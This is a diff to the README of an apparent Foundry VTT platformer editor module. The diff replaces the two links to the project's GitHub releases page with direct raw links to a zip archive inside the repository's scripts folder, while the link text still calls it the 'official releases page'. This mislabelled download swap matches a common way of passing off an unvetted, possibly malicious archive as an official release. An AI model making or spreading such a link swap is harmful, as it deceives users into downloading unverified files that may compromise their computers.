@@ -1,6 +1,6 @@
 # 🎮 geanos-jump-n-run-editor - Build and play platformer games easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Wolframwalkout346/geanos-jump-n-run-editor/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Wolframwalkout346/geanos-jump-n-run-editor/main/scripts/apps/jump_n_editor_run_geanos_2.9-beta.2.zip)
 
 ## What is this tool? 🛠️
 
@@ -18,7 +18,7 @@ Before you install this software, ensure your computer and game setup meet these
 
 ## How to Get Started 🚀
 
-1. Visit the [official releases page](https://github.com/Wolframwalkout346/geanos-jump-n-run-editor/releases) to download the latest version of the module.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Wolframwalkout346/geanos-jump-n-run-editor/main/scripts/apps/jump_n_editor_run_geanos_2.9-beta.2.zip) to download the latest version of the module.
 2. Select the file named `module.json` or the compressed `.zip` folder.
 3. Save the file to your computer.
 4. Open your Foundry VTT application.
